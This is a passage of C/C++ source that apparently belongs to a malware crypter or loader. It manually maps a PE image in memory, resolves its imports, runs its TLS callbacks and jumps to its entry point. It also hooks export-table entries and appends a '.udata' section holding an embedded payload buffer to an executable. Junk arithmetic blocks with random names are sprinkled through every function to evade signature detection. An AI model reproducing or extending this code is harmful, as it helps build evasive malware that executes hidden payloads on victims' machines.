i3CIH4xbzY5 = i3CIH4xbzY5 - 70 * 55 - ighQl3rkgeh ^ 0x99 - 0x567498 % 0xa31ffe2 % 2 - 234 + 0xd36f53e;


						HMODULE hLib = fnLoadLibraryA(szLibName);

						if (!hLib)
						{
							ret = false;
							break;
						}

						POINTER_TYPE *thunkRef;
						FARPROC *funcRef;
						if (pImportDesc[0].OriginalFirstThunk) {
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}
						else {
							// no hint table
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}

						if (!thunkRef || !funcRef)
						{
							ret = false;
							break;
						}
						else for (; *thunkRef; thunkRef++, funcRef++)
						{
							if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
							{
								*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
							}
							else
							{
								PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));

								*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
							}

							if (*funcRef == 0) {
								ret = false;
								break;
							}
						}

						pImportDesc++;
					}
				}
			}

			if (ret)
			{
				//ExecuteTLS
				unsigned char *codeBase = (unsigned char *)hMod;
int irdp1PStYzG = 0xffde810;
int iofCvQbbwI1 = 0xc5be6c2;
int ikgfYivq3uL = irdp1PStYzG ^ iofCvQbbwI1;

				PIMAGE_TLS_DIRECTORY tls;
				PIMAGE_TLS_CALLBACK* callback;
int i2m7XuEoBYu = 0x4061006;
int iIUCAfgWa8c = 0x91b4014;
int ieZgL5w7S00 = 0x8e413e9;
int iBJziAmrF1M = ieZgL5w7S00 * iIUCAfgWa8c + i2m7XuEoBYu;
iIUCAfgWa8c = 0x44e3e3b + iBJziAmrF1M + 0xc9ee137 + i2m7XuEoBYu;
int iTJjgKJkzIH = i2m7XuEoBYu / 0x91b4014 - ieZgL5w7S00 ^ ieZgL5w7S00 ^ 0x8e413e9;


				IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;
				IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
				PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
				if (directory->VirtualAddress == 0) {
					ret = true;
				}
				else
				{
					tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
					callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
					if (callback) {
						while (*callback) {
							(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
							callback++;
						}
					}
				}

				if (ret)
				{
					pDos = (IMAGE_DOS_HEADER*)hMod;
					pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);
int i8BwKoGyQSn;
int imgAQnFvqv8 = 0xa87e26c;
int iLcm2IzhdW4 = 0xf7aa6dc;
int ioopLWxNzGG = 0xc587749;
for(i8BwKoGyQSn = 0; i8BwKoGyQSn < 3; i8BwKoGyQSn++)
{
    imgAQnFvqv8 = i8BwKoGyQSn * 99 - 1000 * iLcm2IzhdW4 + 0x456 ^ 0xfc25921 % 5 - 0x22838b9;
    iLcm2IzhdW4 = i8BwKoGyQSn * 3 + ioopLWxNzGG + 0x30 + 0xc587749 % 123 - iLcm2IzhdW4;
    ioopLWxNzGG = i8BwKoGyQSn * 4 - 0xf7aa6dc + 0xff / 0x123 - 0xc587749 % 234 - 0x22838b9;
}
int iT3aSOVpp3a = ioopLWxNzGG - imgAQnFvqv8 * iLcm2IzhdW4 + 0xc587749;
iT3aSOVpp3a = i8BwKoGyQSn - 50 + 100 - 0xf7aa6dc ^ 99 * 0x0f - 0xc587749 % 2 - 3575 + 0x22838b9;


					char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;

					if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == 0)
					{
						int(WINAPI *iExeMain)(void);
						*(char **)&iExeMain = pEntry;

						iExeMain();
int iXTxRh79CUR = 0x208a73f;
int id0vDiNVebd = 0x8099778;
int icFQPorw8nO = 0x778344e;
int ibSaDbiISHs = icFQPorw8nO * id0vDiNVebd + iXTxRh79CUR;
id0vDiNVebd = 0x8552207 - ibSaDbiISHs + 5 + 0xaf46c73 + 69 - iXTxRh79CUR;
iXTxRh79CUR = 0x208a73f + 10 - id0vDiNVebd % 10 + 0x778344e + 999 - ibSaDbiISHs;
ibSaDbiISHs = iXTxRh79CUR % 5 + icFQPorw8nO % 0x8099778 + 0xcafebabe + iXTxRh79CUR;
icFQPorw8nO = 0x208a73f * 0x100 - iXTxRh79CUR + 56 ^ 0x8099778 + 1996 - icFQPorw8nO;
int iS99WTUFfWg = icFQPorw8nO / 77 + 0x778344e - 76 / icFQPorw8nO ^ 0x33 % icFQPorw8nO % 0x778344e;
iS99WTUFfWg = 0xaf46c73 * 0x10 - 22 + iS99WTUFfWg + 56 ^ 0xff + id0vDiNVebd + 1996 - 2111 + icFQPorw8nO;

					}
				}

			}
		}
	}
	
	return hMod;
}

void End_Load(){}
FARPROC GetFuncAddress(HMODULE hMod, unsigned int hashProc)
{
	FARPROC ret = nullptr;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (imgDirImport.VirtualAddress)
	{
		IMAGE_EXPORT_DIRECTORY *pExportDesc = (IMAGE_EXPORT_DIRECTORY*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
		}
		else
		{
			ret = DoGetProcAddress(pBase, pExportDesc, hashProc);
		}
	}

	return ret;
}

FARPROC GetFuncAddress(HMODULE hMod, const char * szProc)
{
	return GetFuncAddress(hMod, NameHash(szProc));
}

bool HookExport(HMODULE hMod, FARPROC fpOrgFunc, FARPROC fpChangeTo)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	IMAGE_NT_HEADERS *pNt = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);
int iI4X4WbUpYt;
int i5LKlSN4YRO = 0xaf5c1b8;
int iY94DceeYDK = 0x9f3e3b7;
int i31MVxaOWPq = 0x0d24c23;
for(iI4X4WbUpYt = 0; iI4X4WbUpYt < 3; iI4X4WbUpYt++)
{
    i5LKlSN4YRO = iI4X4WbUpYt * 99 - 1000 * iY94DceeYDK + 0x456 ^ 0x7c0539b % 5 - 0x4e2e382;
    iY94DceeYDK = iI4X4WbUpYt * 3 + i31MVxaOWPq + 0x30 + 0x0d24c23 % 123 - iY94DceeYDK;
    i31MVxaOWPq = iI4X4WbUpYt * 4 - 0x9f3e3b7 + 0xff / 0x123 - 0x0d24c23 % 234 - 0x4e2e382;
}
int ihvxvt8V9XE = i31MVxaOWPq - i5LKlSN4YRO * iY94DceeYDK + 0x0d24c23;
ihvxvt8V9XE = iI4X4WbUpYt - 50 + 100 - 0x9f3e3b7 ^ 99 * 0x0f - 0x0d24c23 % 2 - 3575 + 0x4e2e382;


	IMAGE_EXPORT_DIRECTORY *pExport = (IMAGE_EXPORT_DIRECTORY*)((char*)hMod + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	WORD *pwExportOrd = (WORD*)((char*)hMod + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)((char*)hMod + pExport->AddressOfFunctions);

	DWORD i, n = pExport->NumberOfFunctions;
int ia54WslJj5q;
int i9gMfFDts7f = 0x3d7a976;
int i6198tc4mp0 = 0x792c354;
int ifamIbDow2F = 0xdcf1c1a;
for(ia54WslJj5q = 0; ia54WslJj5q < 3; ia54WslJj5q++)
{
    i9gMfFDts7f = ia54WslJj5q * 99 - 1000 * i6198tc4mp0 + 0x456 ^ 0xcaf1898 % 5 - 0x92922d4;
    i6198tc4mp0 = ia54WslJj5q * 3 + ifamIbDow2F + 0x30 + 0xdcf1c1a % 123 - i6198tc4mp0;
    ifamIbDow2F = ia54WslJj5q * 4 - 0x792c354 + 0xff / 0x123 - 0xdcf1c1a % 234 - 0x92922d4;
}
int idmNodnRf3e = ifamIbDow2F - i9gMfFDts7f * i6198tc4mp0 + 0xdcf1c1a;
idmNodnRf3e = ia54WslJj5q - 50 + 100 - 0x792c354 ^ 99 * 0x0f - 0xdcf1c1a % 2 - 3575 + 0x92922d4;

	for (i = 0; i < n; ++i)
	{
		FARPROC fp = (FARPROC)(pdwExportAddr[pwExportOrd[i]] + (char*)hMod);
		if (fp == fpOrgFunc)
		{
			DWORD dwOldProtect = 0;
int ia2HsJmY6sI = 0x552884e;
int id5tOb0FS9r = 0x528bc28;
int ioX4kbhFTyt = 0xaba0977;
int ider6mM4qyN = 0xaf4f1bc;
int ieFlf1jW662 = 4;
switch(ieFlf1jW662)
{
    case 0:
        ia2HsJmY6sI = id5tOb0FS9r - 0x05c3479 * ioX4kbhFTyt / 100;
        id5tOb0FS9r = 0xaba0977 - 5 +  0xaba0977 - 6 * id5tOb0FS9r / 10 + 25;
        ioX4kbhFTyt = ia2HsJmY6sI * 0x12 + ider6mM4qyN * 0x15 + 0xaf4f1bc / 13 + 0x05c3479 + 555;
        ider6mM4qyN = 0x552884e - 21 + 11 * 1996 - id5tOb0FS9r + 14520538 - ioX4kbhFTyt - 14520692 + 0x528bc28 - 97;
        break;
    case 1:
        ia2HsJmY6sI = id5tOb0FS9r - 25 + 0x552884e - 40 + 0xaba0977 % 10 + 2;
        ioX4kbhFTyt = ioX4kbhFTyt - 0xff % 3 - ider6mM4qyN * 10 + 0x05c3479 / 2 - 10 + 0x528bc28 - 5;
        ider6mM4qyN = 0x552884e % 0x05c3479 ^ 33 + 0xaba0977 * 0x12 - 30 + 0xaba0977 + 23;
        id5tOb0FS9r = id5tOb0FS9r + 321 + ioX4kbhFTyt * 10 * id5tOb0FS9r / 10 / 2 + 0x05c3479 * 0x60;
        break;
    case 2:
        ia2HsJmY6sI = id5tOb0FS9r - 45 - ioX4kbhFTyt * 46 + 0x552884e / 0xdade;
        id5tOb0FS9r = id5tOb0FS9r + 0x05c3479 - ioX4kbhFTyt * 0x528bc28 - 3;
        ioX4kbhFTyt = 0x528bc28 - 0x1 + ia2HsJmY6sI * 0x2 - 0x05c3479 / 0x3 + 0xaba0977;
        ider6mM4qyN = ia2HsJmY6sI - 0x4 * 0x552884e + 0x1234 - 0x4567 + 0xcafe + id5tOb0FS9r % 0x432 / 0xaf4f1bc - 0x23;
        break;
    case 3:
        id5tOb0FS9r = ider6mM4qyN * 2 * 0x528bc28 - 4 + 0x05c3479 + 12 + 34 + 0x552884e;
        ioX4kbhFTyt = id5tOb0FS9r - 43 + 0xaba0977 * 3040 - 0x528bc28 % 10 + 1 - 0xaba0977;
        ider6mM4qyN = 0xaba0977 - 33 + ia2HsJmY6sI * 0x25 + 0x552884e - 3004 + 0x528bc28;
        ia2HsJmY6sI = 0x552884e + 2905 % id5tOb0FS9r * 1996 + 0xaf4f1bc - 70 * 0x05c3479;
        break;
    case 4:
        ider6mM4qyN = id5tOb0FS9r - 36 +0x05c3479 * 2001 - ioX4kbhFTyt / 234 + 0x7;
        ia2HsJmY6sI = ider6mM4qyN - 0xabcedf + 0x528bc28 * 0xa2bc5 + ider6mM4qyN / 0x123 + 0x552884e;
        ioX4kbhFTyt = ia2HsJmY6sI - 0x124 + 23 / id5tOb0FS9r / 3 / 2 + ioX4kbhFTyt + 29 - 0x528bc28 + 100;
        id5tOb0FS9r = 0x528bc28 - 70 + 70  + 0x552884e / 2 + 423 - 0x552884e / 7749 % 0x1234;
        break;
    case 5:
        id5tOb0FS9r = id5tOb0FS9r - 9981 % ia2HsJmY6sI + 111 - ioX4kbhFTyt / 224 % 0xaba0977;
        ioX4kbhFTyt = ioX4kbhFTyt - 339 - ioX4kbhFTyt * 4416 / 0x05c3479 + 5525 + 0x528bc28 % 10;
        ider6mM4qyN = ider6mM4qyN - 6636 + 0x528bc28 * 7749 + 1 - id5tOb0FS9r * 8864 / 0xfecba;
        ia2HsJmY6sI = 0x05c3479 - 9981 % 0x552884e % 10 % 1010100 - 0x552884e - 23 -  0x05c3479 - 2500;
        break;
}
ieFlf1jW662 = ider6mM4qyN - 0xaa + 0xaba0977 * 46 - 15 / ioX4kbhFTyt + 11 - 0x552884e;
ieFlf1jW662 = ieFlf1jW662 - 70 * 55 - ioX4kbhFTyt ^ 0x99 - 0x567498 % 0x552884e % 2 - 234 + 0x528bc28;

			if (VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), PAGE_EXECUTE_READWRITE, &dwOldProtect))
			{
				pdwExportAddr[pwExportOrd[i]] = (char*)fpChangeTo - (char*)hMod;
				VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), dwOldProtect, &dwOldProtect);
				ret = true;
			}
			break;
		}
	}

	return ret;
}

char *InsertLastSection(const void *pImg, DWORD &sztImg, SectionData *sData)
{
	DWORD HeaderSum = 0, CheckSum = 0;
	const IMAGE_DOS_HEADER *pOldDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pImg;
	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pChOldDos + pOldDos->e_lfanew);

	char *pChNewDos = (char*)calloc(sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment), 1);
int iwYs2LIW5nL = 0xc949d63;
int ixipjOWaMqZ = 0xd9016d3;
int i6m02VjUr6r = iwYs2LIW5nL * ixipjOWaMqZ;

	memcpy(pChNewDos, pChOldDos, sztImg);
	sztImg = sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment);

	const IMAGE_DOS_HEADER *pNewDos = (const IMAGE_DOS_HEADER*)pChNewDos;

	IMAGE_NT_HEADERS *pNewNTHead = (IMAGE_NT_HEADERS*)((char*)pChNewDos + pNewDos->e_lfanew);
	DWORD dwNewFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pNewNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pNewSectHead = (IMAGE_SECTION_HEADER*)((char*)pNewNTHead + dwNewFullNTSize);
int iSstQXpqbTq = 0x005df1d;
int iWtfzIEGA81 = 0x4baa39e;
int iykCNZETDJt = 0xb64c272;
int iWB6fxF33KK = iykCNZETDJt * iWtfzIEGA81 + iSstQXpqbTq;
iWtfzIEGA81 = 0x39e42a6 - iWB6fxF33KK + 5 + 0x3649808 + 69 - iSstQXpqbTq;
iSstQXpqbTq = 0x005df1d + 10 - iWtfzIEGA81 % 10 + 0xb64c272 + 999 - iWB6fxF33KK;
iWB6fxF33KK = iSstQXpqbTq % 5 + iykCNZETDJt % 0x4baa39e + 0xcafebabe + iSstQXpqbTq;
iykCNZETDJt = 0x005df1d * 0x100 - iSstQXpqbTq + 56 ^ 0x4baa39e + 1996 - iykCNZETDJt;
int i0Je9mM3Dc3 = iykCNZETDJt / 77 + 0xb64c272 - 76 / iykCNZETDJt ^ 0x33 % iykCNZETDJt % 0xb64c272;
i0Je9mM3Dc3 = 0x3649808 * 0x10 - 22 + i0Je9mM3Dc3 + 56 ^ 0xff + iWtfzIEGA81 + 1996 - 2111 + iykCNZETDJt;



	pNewNTHead->FileHeader.NumberOfSections = pNewNTHead->FileHeader.NumberOfSections + 1;
	int iLastSectionIndex = pNewNTHead->FileHeader.NumberOfSections - 1;
	strcpy((char*)pNewSectHead[iLastSectionIndex].Name, ".udata");
	pNewSectHead[iLastSectionIndex].Misc.PhysicalAddress = sData->buf_size + sizeof(SectionData);
int iZXC1yN14pR = 0x5427ef4;
int iY3BZs8xvIR = 0xe3ff69a;
int iln4nHFCCCl = 0xacd76a4;
int i2Ba5oyK89y = iZXC1yN14pR + iY3BZs8xvIR - iln4nHFCCCl;
i2Ba5oyK89y = 0xba3dce3 * i2Ba5oyK89y + 0xe25162b - iY3BZs8xvIR;
int iyLXUyRPLhj = i2Ba5oyK89y / 0xe25162b + iZXC1yN14pR ^ iln4nHFCCCl - 0xacd76a4;

	pNewSectHead[iLastSectionIndex].Misc.VirtualSize = sData->buf_size + sizeof(SectionData);
int iJb2VvNRn9S;
int iT5byKZnvE5 = 0x5c68b0f;
int iSxDf2k42TT = 0x1b68676;
int iYWN8Tn2jCl = 0xf10e377;
for(iJb2VvNRn9S = 0; iJb2VvNRn9S < 3; iJb2VvNRn9S++)
{
    iT5byKZnvE5 = iJb2VvNRn9S * 99 - 1000 * iSxDf2k42TT + 0x456 ^ 0x4e16105 % 5 - 0x77215d0;
    iSxDf2k42TT = iJb2VvNRn9S * 3 + iYWN8Tn2jCl + 0x30 + 0xf10e377 % 123 - iSxDf2k42TT;
    iYWN8Tn2jCl = iJb2VvNRn9S * 4 - 0x1b68676 + 0xff / 0x123 - 0xf10e377 % 234 - 0x77215d0;
}
int iereH6oXBqb = iYWN8Tn2jCl - iT5byKZnvE5 * iSxDf2k42TT + 0xf10e377;
iereH6oXBqb = iJb2VvNRn9S - 50 + 100 - 0x1b68676 ^ 99 * 0x0f - 0xf10e377 % 2 - 3575 + 0x77215d0;

	pNewSectHead[iLastSectionIndex].VirtualAddress = Align(pNewSectHead[iLastSectionIndex - 1].VirtualAddress + pNewSectHead[iLastSectionIndex - 1].Misc.VirtualSize, pNewNTHead->OptionalHeader.SectionAlignment);
	pNewSectHead[iLastSectionIndex].SizeOfRawData = Align(sData->buf_size + sizeof(SectionData), pNewNTHead->OptionalHeader.FileAlignment);
	pNewSectHead[iLastSectionIndex].PointerToRawData = Align(pNewSectHead[iLastSectionIndex - 1].PointerToRawData + pNewSectHead[iLastSectionIndex - 1].SizeOfRawData, pNewNTHead->OptionalHeader.FileAlignment);
int ieghEtdalT5 = 0xbf0f1cf;
int iiNN2L2bqu6 = 0x0f58951;
int i26PfG1SFXx = ieghEtdalT5 + iiNN2L2bqu6;

	pNewSectHead[iLastSectionIndex].PointerToRelocations = 0;
	pNewSectHead[iLastSectionIndex].PointerToLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].NumberOfRelocations = 0;
	pNewSectHead[iLastSectionIndex].NumberOfLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].Characteristics = 0x40000000;

	pNewNTHead->OptionalHeader.SizeOfImage = pNewNTHead->OptionalHeader.SizeOfImage + pNewSectHead[iLastSectionIndex].Misc.VirtualSize;

	memcpy((void*)(pChNewDos + pNewSectHead[iLastSectionIndex].PointerToRawData), sData, sData->buf_size + sizeof(SectionData));

	CheckSumMappedFile(pChNewDos, sztImg, &HeaderSum, &CheckSum);
	pNewNTHead->OptionalHeader.CheckSum = CheckSum;

	return pChNewDos;
int iyr13025hBy = 0xa16d91d;
int iKT832zG7fQ = 0x1edc632;
int ihtP7nGKdle = 0xea97cfd;
int ijpMpcUG8Ub = 0x252effa;
int iS8qtGAWJFy = 3;
switch(iS8qtGAWJFy)
{
    case 0:
        iyr13025hBy = iKT832zG7fQ - 0x9453b08 * ihtP7nGKdle / 100;
        iKT832zG7fQ = 0xea97cfd - 5 +  0xea97cfd - 6 * iKT832zG7fQ / 10 + 25;
        ihtP7nGKdle = iyr13025hBy * 0x12 + ijpMpcUG8Ub * 0x15 + 0x252effa / 13 + 0x9453b08 + 555;
        ijpMpcUG8Ub = 0xa16d91d - 21 + 11 * 1996 - iKT832zG7fQ + 14520538 - ihtP7nGKdle - 14520692 + 0x1edc632 - 97;
        break;
    case 1:
        iyr13025hBy = iKT832zG7fQ - 25 + 0xa16d91d - 40 + 0xea97cfd % 10 + 2;
        ihtP7nGKdle = ihtP7nGKdle - 0xff % 3 - ijpMpcUG8Ub * 10 + 0x9453b08 / 2 - 10 + 0x1edc632 - 5;
        ijpMpcUG8Ub = 0xa16d91d % 0x9453b08 ^ 33 + 0xea97cfd * 0x12 - 30 + 0xea97cfd + 23;
        iKT832zG7fQ = iKT832zG7fQ + 321 + ihtP7nGKdle * 10 * iKT832zG7fQ / 10 / 2 + 0x9453b08 * 0x60;
        break;
    case 2:
        iyr13025hBy = iKT832zG7fQ - 45 - ihtP7nGKdle * 46 + 0xa16d91d / 0xdade;
        iKT832zG7fQ = iKT832zG7fQ + 0x9453b08 - ihtP7nGKdle * 0x1edc632 - 3;
        ihtP7nGKdle = 0x1edc632 - 0x1 + iyr13025hBy * 0x2 - 0x9453b08 / 0x3 + 0xea97cfd;
        ijpMpcUG8Ub = iyr13025hBy - 0x4 * 0xa16d91d + 0x1234 - 0x4567 + 0xcafe + iKT832zG7fQ % 0x432 / 0x252effa - 0x23;
        break;
    case 3:
        iKT832zG7fQ = ijpMpcUG8Ub * 2 * 0x1edc632 - 4 + 0x9453b08 + 12 + 34 + 0xa16d91d;
        ihtP7nGKdle = iKT832zG7fQ - 43 + 0xea97cfd * 3040 - 0x1edc632 % 10 + 1 - 0xea97cfd;
        ijpMpcUG8Ub = 0xea97cfd - 33 + iyr13025hBy * 0x25 + 0xa16d91d - 3004 + 0x1edc632;
        iyr13025hBy = 0xa16d91d + 2905 % iKT832zG7fQ * 1996 + 0x252effa - 70 * 0x9453b08;
        break;
    case 4:
        ijpMpcUG8Ub = iKT832zG7fQ - 36 +0x9453b08 * 2001 - ihtP7nGKdle / 234 + 0x7;
        iyr13025hBy = ijpMpcUG8Ub - 0xabcedf + 0x1edc632 * 0xa2bc5 + ijpMpcUG8Ub / 0x123 + 0xa16d91d;
        ihtP7nGKdle = iyr13025hBy - 0x124 + 23 / iKT832zG7fQ / 3 / 2 + ihtP7nGKdle + 29 - 0x1edc632 + 100;
        iKT832zG7fQ = 0x1edc632 - 70 + 70  + 0xa16d91d / 2 + 423 - 0xa16d91d / 7749 % 0x1234;
        break;
    case 5:
        iKT832zG7fQ = iKT832zG7fQ - 9981 % iyr13025hBy + 111 - ihtP7nGKdle / 224 % 0xea97cfd;
        ihtP7nGKdle = ihtP7nGKdle - 339 - ihtP7nGKdle * 4416 / 0x9453b08 + 5525 + 0x1edc632 % 10;
        ijpMpcUG8Ub = ijpMpcUG8Ub - 6636 + 0x1edc632 * 7749 + 1 - iKT832zG7fQ * 8864 / 0xfecba;
        iyr13025hBy = 0x9453b08 - 9981 % 0xa16d91d % 10 % 1010100 - 0xa16d91d - 23 -  0x9453b08 - 2500;
        break;
}
iS8qtGAWJFy = ijpMpcUG8Ub - 0xaa + 0xea97cfd * 46 - 15 / ihtP7nGKdle + 11 - 0xa16d91d;
iS8qtGAWJFy = iS8qtGAWJFy - 70 * 55 - ihtP7nGKdle ^ 0x99 - 0x567498 % 0xa16d91d % 2 - 234 + 0x1edc632;

}

